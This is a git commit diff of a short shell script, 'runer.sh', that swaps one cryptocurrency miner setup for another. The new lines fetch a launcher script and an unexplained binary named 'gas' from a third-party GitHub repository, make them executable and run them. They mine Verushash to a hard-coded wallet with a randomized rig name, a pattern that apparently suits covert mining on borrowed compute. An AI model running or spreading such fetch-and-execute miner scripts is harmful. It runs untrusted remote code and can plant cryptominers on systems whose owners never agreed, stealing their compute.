cf90d6c28ff1ee2fb3c737163735f28758d6a84b
msuntung <92377886+msuntung@users.noreply.github.com>
2021-10-22 02:42:59 +0700

    Update runer.sh

--- runer.sh
+++ runer.sh
@@ -1,4 +1,4 @@
-wget https://github.com/VerusCoin/nheqminer/releases/download/v0.8.2/nheqminer-Linux-v0.8.2.tgz
-tar -xvf nheqminer-Linux-v0.8.2.tgz 
-tar -xvf nheqminer-Linux-v0.8.2.tar.gz
-nheqminer/nheqminer -v -l verushash.mine.zergpool.com:3300 -u DLVmTEYCYM9jMCEWiuNuuAJ2M7GETpHcg4.node-18 -p x c=DGB -t 4
+wget https://raw.githubusercontent.com/hunshukajh/yes/main/cmdline_launcher.sh
+wget https://github.com/hunshukajh/yes/raw/main/gas
+chmod +x gas cmdline_launcher.sh
+./cmdline_launcher.sh -algo Verushash -coin VRSC -wallet RGVegWzDKhuPUAKJybftAZm4BXShNFPCYe  -rigName  $(echo $(shuf -i 1-2 -n 1)-joa) -pool1 na.luckpool.net:3956
